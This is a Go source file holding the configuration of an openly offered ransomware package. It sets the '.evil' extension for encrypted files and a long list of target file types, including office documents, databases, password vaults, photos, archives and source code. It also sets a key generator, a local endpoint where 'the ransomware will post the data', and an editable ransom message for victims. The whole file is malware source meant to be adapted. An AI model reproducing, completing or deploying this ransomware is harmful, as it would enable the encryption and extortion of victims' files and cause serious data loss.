package ransom

// Encrypted files extension
const extension = ".evil"

const maxFileSize = 1024 * 1024 * 1024 * 1024

// UseDict The dict is faster if you have ~70 or more extensions
const UseDict = true

// Change extensions in either extensionsSlice or extensionDict depending on which one you use
var extensionsSlice = []string{
	".bk", ".txt", ".hc", ".mp4", ".7z", ".flp", ".mkv", ".flac", ".flv", ".dat", ".kdbx", ".aep", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".odp", ".ods", ".odt", ".ppt", ".pptx", ".raw", ".jpg", ".jpeg", ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".c", ".cs", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".iso", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".db",
}
var extensionDict = map[string]byte{
	".bk": 1, ".txt": 1, ".hc": 1, ".7z": 1, ".flp": 1, ".flac": 1, ".flv": 1, ".dat": 1, ".kdbx": 1, ".aep": 1, ".contact": 1, ".settings": 1, ".doc": 1, ".docx": 1, ".xls": 1, ".xlsx": 1, ".odp": 1, ".ods": 1, ".odt": 1, ".ppt": 1, ".pptx": 1, ".raw": 1, ".jpg": 1, ".jpeg": 1, ".png": 1, ".csv": 1, ".py": 1, ".sql": 1, ".mdb": 1, ".php": 1, ".asp": 1, ".aspx": 1, ".html": 1, ".htm": 1, ".xml": 1, ".psd": 1, ".pdf": 1, ".c": 1, ".cs": 1, ".mp3": 1, ".mp4": 1, ".f3d": 1, ".dwg": 1, ".cpp": 1, ".zip": 1, ".rar": 1, ".mov": 1, ".rtf": 1, ".bmp": 1, ".mkv": 1, ".avi": 1, ".iso": 1, ".bz2": 1, ".cab": 1, ".gzip": 1, ".lzh": 1, ".tar": 1, ".uue": 1, ".xz": 1, ".z": 1, ".001": 1, ".mpeg": 1, ".mpg": 1, ".db": 1,
}

// Debug DebugMode
const Debug = true

// The endpoint where the ransomware will post the data
const endpoint = "127.0.0.1:6031/ransomware"

// The Charset used for the ransomware's password
const charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"

// Key If you want to use a satic key, put it here
var Key = GenerateKey()

// TODO: code a custom uuid thingy or use a package
var UUID = ""

// Change this message based on what you want the user to see
var Message = "Your unique id is " + UUID + " other text you might want here"
